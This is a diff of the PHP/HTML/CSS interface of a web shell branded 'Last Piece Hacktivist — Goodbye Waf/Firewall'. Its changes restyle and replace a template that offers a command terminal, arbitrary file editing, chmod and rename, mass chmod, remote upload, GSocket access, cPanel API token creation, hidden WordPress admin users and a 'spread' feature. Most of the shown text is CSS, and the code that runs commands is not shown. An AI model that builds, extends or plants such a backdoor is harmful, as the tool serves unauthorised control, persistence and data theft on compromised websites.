+    background: linear-gradient(90deg, var(--gold), var(--accent));
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+}
+
+.header-sub { font-size: 11px; color: var(--text-muted); }
+
+.header-right { display: flex; align-items: center; gap: 12px; }
+
+.sys-badge {
+    background: var(--bg-input);
+    border: 1px solid var(--border);
+    padding: 4px 10px;
+    border-radius: 6px;
+    font-size: 10px;
+    color: var(--text-muted);
+}
+
+.container { max-width: 1400px; margin: 0 auto; padding: 16px; }
+
+.breadcrumb {
+    background: var(--bg-card);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 10px 16px;
+    margin-bottom: 12px;
+    font-size: 12px;
+    overflow-x: auto;
+    white-space: nowrap;
+}
+
+.breadcrumb a { color: var(--accent); text-decoration: none; }
+.breadcrumb a:hover { color: var(--gold); text-decoration: underline; }
+
+.toolbar {
+    background: var(--bg-card);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 10px 16px;
+    margin-bottom: 12px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    flex-wrap: wrap;
+}
+
+.toolbar-label {
+    font-size: 10px;
+    text-transform: uppercase;
+    color: var(--text-muted);
+    font-weight: 600;
+    margin-right: 6px;
+}
+
+.btn {
+    padding: 6px 14px;
+    border-radius: 6px;
+    font-size: 11px;
+    font-weight: 500;
+    border: 1px solid var(--border);
+    cursor: pointer;
+    transition: all 0.2s;
+    display: inline-flex;
+    align-items: center;
+    gap: 5px;
+    font-family: inherit;
+    text-decoration: none;
+    color: var(--text);
+    background: var(--bg-input);
+}
+
+.btn:hover { border-color: var(--accent); }
+
+.btn-sm { padding: 4px 10px; font-size: 10px; }
+
+.btn-primary {
+    background: linear-gradient(135deg, var(--gold), var(--gold-dark));
+    color: #000;
+    border-color: var(--gold);
+    font-weight: 600;
+}
+
+.btn-primary:hover { box-shadow: 0 0 15px rgba(255, 215, 0, 0.4); }
+
+.btn-secondary {
+    background: var(--bg-input);
+    color: var(--text);
+    border-color: var(--border);
+}
+
+.btn-danger {
+    background: rgba(248, 81, 73, 0.15);
+    color: var(--red);
+    border-color: rgba(248, 81, 73, 0.3);
+}
+
+.btn-danger:hover { background: var(--red); color: white; }
+
+.btn-scan {
+    background: linear-gradient(135deg, #06b6d4, #0891b2);
+    color: white;
+    border-color: #06b6d4;
+}
+
+.btn-chmod {
+    background: linear-gradient(135deg, #ec4899, #db2777);
+    color: white;
+    border-color: #ec4899;
+}
+
+.btn-spread {
+    background: linear-gradient(135deg, #f59e0b, #d97706);
+    color: #000;
+    border-color: #f59e0b;
+}
+
+.btn-gs {
+    background: linear-gradient(135deg, #10b981, #059669);
+    color: white;
+    border-color: #10b981;
+}
+
+.btn-gs:hover {
+    box-shadow: 0 0 15px rgba(16, 185, 129, 0.5);
+}
+
+.btn-uapi {
+    background: linear-gradient(135deg, #8b5cf6, #7c3aed);
+    color: white;
+    border-color: #8b5cf6;
+}
+
+.btn-uapi:hover {
+    box-shadow: 0 0 15px rgba(139, 92, 246, 0.5);
+}
+
+.btn-ftp {
+    background: linear-gradient(135deg, #f97316, #ea580c);
+    color: white;
+    border-color: #f97316;
+}
+
+.btn-ftp:hover {
+    box-shadow: 0 0 15px rgba(249, 115, 22, 0.5);
+}
+
+.btn-wp {
+    background: linear-gradient(135deg, #3b82f6, #2563eb);
+    color: white;
+    border-color: #3b82f6;
+}
+.btn-wp:hover {
+    box-shadow: 0 0 15px rgba(59, 130, 246, 0.5);
+}
+
+.btn-proc {
+    background: linear-gradient(135deg, #ec4899, #db2777);
+    color: white;
+    border-color: #ec4899;
+}
+.btn-proc:hover {
+    box-shadow: 0 0 15px rgba(236, 72, 153, 0.5);
+}
+
+.wp-user-row {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    padding: 10px;
+    background: var(--bg-secondary);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    margin-bottom: 4px;
+}
+.wp-user-row:hover { border-color: var(--accent); }
+.wp-user-row.wp-hidden {
+    background: rgba(59, 130, 246, 0.08);
+    border-color: rgba(59, 130, 246, 0.3);
+}
+.wp-badge {
+    display: inline-block;
+    padding: 1px 6px;
+    border-radius: 3px;
+    font-size: 9px;
+    font-weight: 700;
+    text-transform: uppercase;
+}
+.wp-badge-hidden { background: #3b82f6; color: white; }
+.wp-badge-admin { background: #f59e0b; color: #000; }
+.wp-pw-box {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    background: var(--bg-primary);
+    border: 1px solid var(--accent);
+    border-radius: 4px;
+    padding: 3px 8px;
+    margin-top: 6px;
+    font-family: monospace;
+    font-size: 11px;
+    color: var(--green);
+}
+
+.upload-label {
+    display: inline-flex;
+    align-items: center;
+    gap: 5px;
+    padding: 4px 10px;
+    font-size: 10px;
+    border-radius: 6px;
+    cursor: pointer;
+    font-family: inherit;
+    font-weight: 500;
+    background: var(--bg-input);
+    color: var(--text);
+    border: 1px solid var(--border);
+    transition: all 0.2s;
+}
+
+.upload-label:hover { border-color: var(--accent); }
+.upload-label input[type="file"] { display: none; }
+.upload-label svg { width: 14px; height: 14px; }
+
+.file-table {
+    width: 100%;
+    border-collapse: collapse;
+    background: var(--bg-card);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    overflow: hidden;
+    margin-bottom: 12px;
+}
+
+.file-table th {
+    background: rgba(255, 215, 0, 0.08);
+    color: var(--gold);
+    font-size: 10px;
+    text-transform: uppercase;
+    padding: 10px 14px;
+    text-align: left;
+    font-weight: 600;
+    border-bottom: 1px solid var(--border);
+}
+
+.file-table td {
+    padding: 8px 14px;
+    border-bottom: 1px solid rgba(30, 30, 58, 0.5);
+    font-size: 12px;
+}
+
+.file-table tr:hover { background: rgba(0, 212, 255, 0.03); }
+
+.file-table td a { color: var(--accent); text-decoration: none; }
+.file-table td a:hover { color: var(--gold); text-decoration: underline; }
+
+.file-icon { display: inline-flex; align-items: center; gap: 8px; }
+
+.folder-icon { color: var(--gold); }
+.file-icon-type { color: var(--accent); }
+
+.action-btns { display: flex; gap: 4px; flex-wrap: wrap; }
+
+.action-btns a {
+    padding: 3px 8px;
+    font-size: 10px;
+    border-radius: 4px;
+    text-decoration: none;
+    border: 1px solid var(--border);
+    color: var(--text-muted);
+    transition: all 0.2s;
+}
+
+.action-btns a:hover { border-color: var(--accent); color: var(--accent); }
+.action-btns a.act-del { border-color: rgba(248,81,73,0.3); color: var(--red); }
+.action-btns a.act-del:hover { background: var(--red); color: white; }
+
+.cmd-section {
+    background: var(--bg-card);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 14px;
+    margin-bottom: 12px;
+}
+
+.cmd-prompt {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+}
+
+.cmd-user { color: var(--green); font-size: 12px; }
+.cmd-dollar { color: var(--gold); }
+
+.cmd-prompt input {
+    flex: 1;
+    background: transparent;
+    border: none;
+    color: var(--text);
+    font-family: inherit;
+    font-size: 12px;
+    outline: none;
+}
+
+.cmd-output {
+    background: #000;
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 12px;
+    margin-top: 10px;
+    max-height: 300px;
+    overflow-y: auto;
+}
+
+.cmd-output pre {
+    color: #00d4ff;
+    font-size: 11px;
+    white-space: pre-wrap;
+    word-wrap: break-word;
+    font-family: inherit;
+    margin: 0;
+}
+
+.form-group { margin-bottom: 12px; }
+.form-label { display: block; font-size: 11px; color: var(--text-muted); margin-bottom: 4px; font-weight: 500; }
+.form-input {
+    width: 100%;
+    background: var(--bg-input);
+    border: 1px solid var(--border);
+    color: var(--text);
+    padding: 8px 12px;
+    border-radius: 6px;
+    font-family: inherit;
+    font-size: 12px;
+    outline: none;
+    transition: border-color 0.2s;
+}
+.form-input:focus { border-color: var(--accent); }
+
+.editor-area {
+    width: 100%;
+    min-height: 400px;
+    background: #000;
+    border: 1px solid var(--border);
+    color: var(--green);
+    padding: 14px;
+    border-radius: 6px;
+    font-family: inherit;
+    font-size: 12px;
+    outline: none;
+    resize: vertical;
+    line-height: 1.6;
+}
+
+.msg-success {
+    background: rgba(63, 185, 80, 0.1);
+    border: 1px solid rgba(63, 185, 80, 0.3);
+    color: var(--green);
+    padding: 8px 14px;
+    border-radius: 6px;
+    font-size: 12px;
+    margin-bottom: 12px;
+}
+
+.msg-error {
+    background: rgba(248, 81, 73, 0.1);
+    border: 1px solid rgba(248, 81, 73, 0.3);
+    color: var(--red);
+    padding: 8px 14px;
+    border-radius: 6px;
+    font-size: 12px;
+    margin-bottom: 12px;
+}
+
+.modal-overlay {
+    position: fixed;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    background: rgba(0, 0, 0, 0.8);
+    backdrop-filter: blur(4px);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    z-index: 9999;
+}
+
+.modal {
+    background: var(--bg-card);
+    border: 1px solid var(--border);
+    border-radius: 12px;
+    max-width: 500px;
+    width: 90%;
+    box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+}
+
+.modal-header {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 14px 18px;
+    border-bottom: 1px solid var(--border);
+}
+
+.modal-title { font-weight: 600; font-size: 14px; color: var(--gold); }
+.modal-close { background: none; border: none; color: var(--text-muted); cursor: pointer; padding: 4px; }
+.modal-close:hover { color: var(--red); }
+.modal-body { padding: 18px; }
+.modal-footer { padding: 14px 18px; border-top: 1px solid var(--border); display: flex; justify-content: flex-end; gap: 8px; }
+
 .hidden { display: none !important; }
-        
-        .uploader-row {
-            display: flex;
-            gap: 8px;
-            align-items: center;
-            margin-bottom: 8px;
-        }
-        
-        .custom-file-input {
-            flex: 1;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            background: var(--bg-input);
-            border: 1px solid var(--border);
-            border-radius: 6px;
-            padding: 6px 10px;
-            cursor: pointer;
-            transition: all 0.2s;
-        }
-        
-        .custom-file-input:hover {
-            border-color: var(--accent);
-            background: rgba(0, 212, 255, 0.05);
-        }
-        
-        .custom-file-input input[type="file"] {
-            display: none;
-        }
-        
-        .custom-file-input .file-btn {
-            display: flex;
-            align-items: center;
-            gap: 6px;
-            background: linear-gradient(135deg, var(--accent), #0077b6);
-            color: white;
-            padding: 5px 12px;
-            border-radius: 4px;
-            font-size: 11px;
-            font-weight: 500;
-            white-space: nowrap;
-        }
-        
-        .custom-file-input .file-name {
-            font-size: 11px;
-            color: var(--text-muted);
-            overflow: hidden;
-            text-overflow: ellipsis;
-            white-space: nowrap;
-            flex: 1;
-        }
-        
-        .custom-file-input.has-file .file-name {
-            color: var(--gold);
-        }
-        
-        .app-footer {
-            background: linear-gradient(180deg, var(--bg-card), rgba(10, 14, 26, 0.98));
-            border-top: 1px solid var(--border);
-            padding: 16px 20px;
-            margin-top: 20px;
-        }
-        
-        .app-footer::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            height: 1px;
-            background: linear-gradient(90deg, transparent, var(--gold), var(--accent), var(--gold), transparent);
-        }
-        
-        .footer-content {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            flex-wrap: wrap;
-            gap: 16px;
-            max-width: 1200px;
-            margin: 0 auto;
-            position: relative;
-        }
-        
-        .footer-brand {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-        }
-        
-        .footer-avatar {
-            width: 45px;
-            height: 45px;
-            border-radius: 50%;
-            border: 2px solid var(--gold);
-            box-shadow: 0 0 15px var(--glow-gold), 0 0 25px var(--glow-cyan);
-            object-fit: cover;
-        }
-        
-        .footer-info {
-            display: flex;
-            flex-direction: column;
-        }
-        
-        .footer-title {
-            font-size: 14px;
-            font-weight: 700;
-            background: linear-gradient(90deg, var(--gold), var(--orange), var(--gold));
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-        }
-        
-        .footer-version {
-            font-size: 11px;
-            color: var(--accent);
-            font-weight: 500;
-        }
-        
-        .footer-credit {
-            font-size: 12px;
-            color: var(--text-muted);
-        }
-        
-        .footer-author {
-            color: var(--gold);
-            font-weight: 600;
-        }
-        
-    </style>
+
+.uploader-row { display: flex; gap: 8px; align-items: center; margin-bottom: 8px; }
+
+.custom-file-input {
+    flex: 1;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    background: var(--bg-input);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 6px 10px;
+    cursor: pointer;
+    transition: all 0.2s;
+}
+
+.custom-file-input:hover { border-color: var(--accent); }
+.custom-file-input input[type="file"] { display: none; }
+
+.custom-file-input .file-btn {
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    background: linear-gradient(135deg, var(--accent), #0077b6);
+    color: white;
+    padding: 5px 12px;
+    border-radius: 4px;
+    font-size: 11px;
+    font-weight: 500;
+    white-space: nowrap;
+}
+
+.custom-file-input .file-name {
+    font-size: 11px;
+    color: var(--text-muted);
+    overflow: hidden;
+    text-overflow: ellipsis;
+    white-space: nowrap;
+    flex: 1;
+}
+
+.custom-file-input.has-file .file-name { color: var(--gold); }
+
+.app-footer {
+    background: linear-gradient(135deg, #0d0d1e 0%, #1a0a2e 100%);
+    border-top: 1px solid var(--border);
+    padding: 16px 20px;
+    text-align: center;
+    margin-top: 20px;
+}
+
+.footer-content { display: flex; align-items: center; justify-content: center; gap: 12px; }
+.footer-avatar { width: 30px; height: 30px; border-radius: 50%; border: 2px solid var(--gold); }
+.footer-text { font-size: 11px; color: var(--text-muted); }
+.footer-text span { color: var(--gold); font-weight: 600; }
+</style>
 </head>
 <body>
 
 <?php if (isset($_GET['edit'])): ?>
-<?php $editFile = $_GET['edit']; $editContent = readFileContent($editFile); ?>
-<div class="video-background">
-    <video autoplay muted loop playsinline>
-        <source src="/videos/background.mp4" type="video/mp4">
-    </video>
-</div>
-<div class="app">
-    <header class="header">
-        <div class="header-content">
-            <div class="brand">
-                <div class="brand-icon">
-                    <img src="https://l.top4top.io/p_3688fo4y41.png" alt="Last Piece">
-                </div>
-                <div class="brand-text"><span>Last Piece</span> Hacktivist<small>Goodbye Waf/Firewall</small></div>
-            </div>
-            <div class="header-actions">
-                <a href="?nomi=<?php echo urlencode(dirname($editFile)); ?>" class="btn btn-secondary btn-sm">Back</a>
-                <a href="?logout" class="btn btn-danger btn-sm">Logout</a>
-            </div>
-        </div>
-    </header>
-    
-    <main class="main">
-        <?php if ($responseMessage): ?>
-        <div class="<?php echo $responseMessage['success'] ? 'success-msg' : 'error-msg'; ?>">
-            <?php echo htmlspecialchars($responseMessage['message']); ?>
-        </div>
-        <?php endif; ?>
-        
-        <form method="POST" class="editor-container">
-            <div class="editor-header">
-                <div class="editor-title">
-                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                        <path d="M14.5 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7.5L14.5 2z"/>
-                        <polyline points="14 2 14 8 20 8"/>
-                    </svg>
-                    <?php echo htmlspecialchars(basename($editFile)); ?>
-                </div>
-                <div class="editor-actions">
-                    <button type="submit" class="btn btn-primary btn-sm">Save Changes</button>
-                </div>
-            </div>
-            <textarea name="content" class="editor-textarea"><?php echo htmlspecialchars($editContent); ?></textarea>
-        </form>
-    </main>
-</div>
-
-<?php elseif (isset($_GET['chmod'])): ?>
-<?php $chmodFile = $_GET['chmod']; $currentPerm = @substr(sprintf('%o', fileperms($chmodFile)), -4); ?>
-<div class="video-background">
-    <video autoplay muted loop playsinline>
-        <source src="/videos/background.mp4" type="video/mp4">
-    </video>
-</div>
-<div class="app">
-    <header class="header">
-        <div class="header-content">
-            <div class="brand">
-                <div class="brand-icon">
-                    <img src="https://l.top4top.io/p_3688fo4y41.png" alt="Last Piece">
-                </div>
-                <div class="brand-text"><span>Last Piece</span> Hacktivist<small>Goodbye Waf/Firewall</small></div>
-            </div>
-            <div class="header-actions">
-                <a href="?nomi=<?php echo urlencode(dirname($chmodFile)); ?>" class="btn btn-secondary btn-sm">Back</a>
-                <a href="?logout" class="btn btn-danger btn-sm">Logout</a>
-            </div>
-        </div>
-    </header>
-    
-    <main class="main">
-        <?php if ($responseMessage): ?>
-        <div class="<?php echo $responseMessage['success'] ? 'success-msg' : 'error-msg'; ?>">
-            <?php echo htmlspecialchars($responseMessage['message']); ?>
-        </div>
-        <?php endif; ?>
-        
-        <form method="POST" class="action-form">
-            <div class="action-form-header">
-                <div class="action-form-title">
-                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                        <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
-                        <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
-                    </svg>
-                    <span>Change Permission</span>
-                    <span class="action-form-file"><?php echo htmlspecialchars(basename($chmodFile)); ?></span>
-                </div>
-                <button type="submit" class="btn btn-primary btn-sm">Apply</button>
-            </div>
-            <div class="action-form-body">
-                <div class="form-inline">
-                    <label class="form-label-inline">Permission</label>
-                    <input type="text" name="permission" class="form-input-inline" value="<?php echo htmlspecialchars($currentPerm); ?>" placeholder="e.g. 0755" required>
-                </div>
-            </div>
-        </form>
-    </main>
-</div>
-
-<?php elseif (isset($_GET['rename'])): ?>
-<?php $renameFile = $_GET['rename']; ?>
-<div class="video-background">
-    <video autoplay muted loop playsinline>
-        <source src="/videos/background.mp4" type="video/mp4">
-    </video>
-</div>
-<div class="app">
-    <header class="header">
-        <div class="header-content">
-            <div class="brand">
-                <div class="brand-icon">
-                    <img src="https://l.top4top.io/p_3688fo4y41.png" alt="Last Piece">
-                </div>
-                <div class="brand-text"><span>Last Piece</span> Hacktivist<small>Goodbye Waf/Firewall</small></div>
-            </div>
-            <div class="header-actions">
-                <a href="?nomi=<?php echo urlencode(dirname($renameFile)); ?>" class="btn btn-secondary btn-sm">Back</a>
-                <a href="?logout" class="btn btn-danger btn-sm">Logout</a>
-            </div>
-        </div>
-    </header>
-    
-    <main class="main">
-        <?php if ($responseMessage): ?>
-        <div class="<?php echo $responseMessage['success'] ? 'success-msg' : 'error-msg'; ?>">
-            <?php echo htmlspecialchars($responseMessage['message']); ?>
-        </div>
-        <?php endif; ?>
-        
-        <form method="POST" class="action-form">
-            <div class="action-form-header">
-                <div class="action-form-title">
-                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                        <path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7"/>
-                        <path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z"/>
-                    </svg>
-                    <span>Rename</span>
-                    <span class="action-form-file"><?php echo htmlspecialchars(basename($renameFile)); ?></span>
-                </div>
-                <button type="submit" class="btn btn-primary btn-sm">Rename</button>
-            </div>
-            <div class="action-form-body">
-                <div class="form-inline">
-                    <label class="form-label-inline">New Name</label>
-                    <input type="text" name="new_name" class="form-input-inline" value="<?php echo htmlspecialchars(basename($renameFile)); ?>" required>
-                </div>
-            </div>
-        </form>
-    </main>
-</div>
-
-<?php else: ?>
-<?php $files = getFileDetails($currentDirectory); ?>
-<div class="video-background">
-    <video autoplay muted loop playsinline>
-        <source src="/videos/background.mp4" type="video/mp4">
-    </video>
-</div>
-<div class="app">
-    <header class="header">
-        <div class="header-content">
-            <div class="brand">
-                <div class="brand-icon">
-                    <img src="https://l.top4top.io/p_3688fo4y41.png" alt="Last Piece">
-                </div>
-                <div class="brand-text"><span>Last Piece</span> Hacktivist<small>Goodbye Waf/Firewall</small></div>
-            </div>
-            <div class="header-actions">
-
-                <a href="?logout" class="btn btn-danger btn-sm">
-                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                        <path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/>
-                        <polyline points="16 17 21 12 16 7"/>
-                        <line x1="21" y1="12" x2="9" y2="12"/>
-                    </svg>
-                    <span class="hide-mobile">Logout</span>
-                </a>
-            </div>
-        </div>
-    </header>
-    
-    <main class="main">
-        <?php if ($responseMessage): ?>
-        <div class="<?php echo $responseMessage['success'] ? 'success-msg' : 'error-msg'; ?>">
-            <?php echo htmlspecialchars($responseMessage['message']); ?>
-        </div>
-        <?php endif; ?>
-        
-        <div class="breadcrumb">
-            <svg class="breadcrumb-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                <path d="m3 9 9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/>
-                <polyline points="9 22 9 12 15 12 15 22"/>
-            </svg>
-            <?php
-            $pathParts = explode('/', $currentDirectory);
-            $buildPath = '';
-            foreach ($pathParts as $i => $part) {
-                if ($part === '') continue;
-                $buildPath .= '/' . $part;
-                if ($i > 0) echo '<span class="breadcrumb-sep">/</span>';
-                echo '<a href="?nomi=' . urlencode($buildPath) . '">' . htmlspecialchars($part) . '</a>';
-            }
-            ?>
-        </div>
-        
-        <div class="toolbar">
-            <div class="toolbar-label">Features</div>
-            <div class="toolbar-section">
-                <form method="POST" style="display: contents;">
-                    <button type="submit" name="wordpress_tool" class="btn btn-wordpress btn-sm">
-                        <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor">
-                            <path d="M12 2C6.486 2 2 6.486 2 12s4.486 10 10 10 10-4.486 10-10S17.514 2 12 2zm0 19.5c-5.238 0-9.5-4.262-9.5-9.5S6.762 2.5 12 2.5s9.5 4.262 9.5 9.5-4.262 9.5-9.5 9.5z"/>
-                        </svg>
-                        WordPress
-                    </button>
-                </form>
-                <button onclick="showModal('gsocket')" class="btn btn-gsocket btn-sm">
-                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                        <path d="M12 2L2 7l10 5 10-5-10-5z"/>
-                        <path d="M2 17l10 5 10-5"/>
-                        <path d="M2 12l10 5 10-5"/>
-                    </svg>
-                    GSocket
-                </button>
-                <form method="POST" style="display: contents;">
-                    <button type="submit" name="cpanel_token" class="btn btn-cpanel btn-sm">
-                        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                            <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
-                            <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
-                        </svg>
-                        Create Uapi Token
-                    </button>
-                </form>
-                <button onclick="showModal('ftp')" class="btn btn-ftp btn-sm">
-                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                        <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>
-                        <polyline points="17 8 12 3 7 8"/>
-                        <line x1="12" y1="3" x2="12" y2="15"/>
-                    </svg>
-                    FTP Manager
-                </button>
-            </div>
-        </div>
-        
-        <div class="toolbar">
-            <div class="toolbar-label">Scanner</div>
-            <div class="toolbar-section">
-                <form method="POST" style="display: contents;">
-                    <button type="submit" name="scan_deep" class="btn btn-scan btn-sm">
-                        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                            <path d="M3 3v18h18"/>
-                            <path d="m19 9-5 5-4-4-3 3"/>
-                        </svg>
-                        Deepest Dir
-                    </button>
-                </form>
-                <form method="POST" style="display: contents;">
-                    <input type="hidden" name="scan_ext" value="php">
-                    <button type="submit" name="scan_newly" class="btn btn-scan btn-sm">
-                        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                            <circle cx="12" cy="12" r="10"/>
-                            <polyline points="12 6 12 12 16 14"/>
-                        </svg>
-                        New PHP Files
-                    </button>
-                </form>
-                <button onclick="showModal('chmod')" class="btn btn-chmod btn-sm">
-                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
-                    </svg>
-                    Mass Chmod
-                </button>
-            </div>
-        </div>
-        
-        <div class="toolbar">
-            <div class="toolbar-label">Files</div>
-            <div class="toolbar-section">
-                <form method="POST" enctype="multipart/form-data" style="display: contents;">
-                    <label class="upload-label">
-                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                            <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>
-                            <polyline points="17 8 12 3 7 8"/>
-                            <line x1="12" y1="3" x2="12" y2="15"/>
-                        </svg>
-                        Upload
-                        <input type="file" name="file" onchange="this.form.submit()">
-                    </label>
-                    <input type="hidden" name="upload" value="1">
-                </form>
-                <button onclick="showModal('multiupload')" class="btn btn-secondary btn-sm">
-                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                        <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>
-                        <polyline points="17 8 12 3 7 8"/>
-                        <line x1="12" y1="3" x2="12" y2="15"/>
-                    </svg>
-                    Multi Upload
-                </button>
-                <button onclick="showModal('remote')" class="btn btn-secondary btn-sm">
-                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                        <path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/>
-                        <path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/>
-                    </svg>
-                    Remote Upload
-                </button>
-                <button onclick="showModal('newfile')" class="btn btn-secondary btn-sm">
-                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                        <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/>
-                        <polyline points="14 2 14 8 20 8"/>
-                        <line x1="12" y1="18" x2="12" y2="12"/>
-                        <line x1="9" y1="15" x2="15" y2="15"/>
-                    </svg>
-                    New File
-                </button>
-                <button onclick="showModal('newfolder')" class="btn btn-secondary btn-sm">
-                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                        <path d="M4 20h16a2 2 0 0 0 2-2V8a2 2 0 0 0-2-2h-7.93a2 2 0 0 1-1.66-.9l-.82-1.2A2 2 0 0 0 7.93 3H4a2 2 0 0 0-2 2v13c0 1.1.9 2 2 2Z"/>
-                        <line x1="12" y1="10" x2="12" y2="16"/>
-                        <line x1="9" y1="13" x2="15" y2="13"/>
-                    </svg>
-                    New Folder
-                </button>
-            </div>
-        </div>
-        
-        <div class="toolbar">
-            <div class="toolbar-label">Terminal</div>
-            <form method="POST" class="terminal-form">
-                <input type="text" name="cmd" class="terminal-input" placeholder="Enter command..." autocomplete="off">
-                <button type="submit" class="btn btn-primary btn-sm">Run</button>
-            </form>
-        </div>
-        
-        <?php if ($cmdOutput): ?>
-        <div class="terminal-output"><?php echo htmlspecialchars($cmdOutput); ?></div>
-        <?php endif; ?>
-        
-        <div class="table-wrapper">
-            <div class="table-scroll">
-                <table class="file-table">
-                    <thead>
-                        <tr>
-                            <th>Name</th>
-                            <th class="hide-mobile">Size</th>
-                            <th>Permission</th>
-                            <th class="hide-mobile">Modified</th>
-                            <th>Actions</th>
-                        </tr>
-                    </thead>
-                    <tbody>
-                        <tr>
-                            <td colspan="5">
-                                <a href="?nomi=.." class="file-name">
-                                    <svg class="file-icon folder" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                                        <path d="M4 20h16a2 2 0 0 0 2-2V8a2 2 0 0 0-2-2h-7.93a2 2 0 0 1-1.66-.9l-.82-1.2A2 2 0 0 0 7.93 3H4a2 2 0 0 0-2 2v13c0 1.1.9 2 2 2Z"/>
-                                    </svg>
-                                    ..
-                                </a>
-                            </td>
-                        </tr>
-                        <?php foreach ($files as $file): ?>
-                        <?php $fullPath = $currentDirectory . '/' . $file['name']; ?>
-                        <tr>
-                            <td>
-                                <?php if ($file['type'] === 'Folder'): ?>
-                                <a href="?nomi=<?php echo urlencode($fullPath); ?>" class="file-name">
-                                    <?php echo getFileIcon($file['type'], $file['name']); ?>
-                                    <?php echo htmlspecialchars($file['name']); ?>
-                                </a>
-                                <?php else: ?>
-                                <span class="file-name">
-                                    <?php echo getFileIcon($file['type'], $file['name']); ?>
-                                    <?php echo htmlspecialchars($file['name']); ?>
-                                </span>
-                                <?php endif; ?>
-                            </td>
-                            <td class="hide-mobile text-muted"><?php echo $file['size']; ?></td>
-                            <td>
-                                <span class="<?php echo $file['writable'] ? 'perm-writable' : 'perm-readonly'; ?>">
-                                    <?php echo $file['permission']; ?>
-                                </span>
-                            </td>
-                            <td class="hide-mobile text-muted"><?php echo $file['modified']; ?></td>
-                            <td>
-                                <div class="file-actions">
-                                    <?php if ($file['type'] !== 'Folder'): ?>
-                                    <a href="?edit=<?php echo urlencode($fullPath); ?>" class="action-btn">Edit</a>
-                                    <?php endif; ?>
-                                    <a href="?chmod=<?php echo urlencode($fullPath); ?>" class="action-btn">Chmod</a>
-                                    <a href="?rename=<?php echo urlencode($fullPath); ?>" class="action-btn">Rename</a>
-                                    <a href="#" class="action-btn danger" onclick="showDeleteConfirm('<?php echo urlencode($fullPath); ?>', '<?php echo htmlspecialchars(addslashes($item)); ?>'); return false;">Delete</a>
-                                </div>
-                            </td>
-                        </tr>
-                        <?php endforeach; ?>
-                    </tbody>
-                </table>
-            </div>
-        </div>
-        
-        
-    </main>
-    
-    <footer class="app-footer">
-        <div class="footer-content">
-            <div class="footer-brand">
-                <img src="https://g.top4top.io/p_3688ocdw61.png" alt="Portgas D Ace" class="footer-avatar">
-                <div class="footer-info">
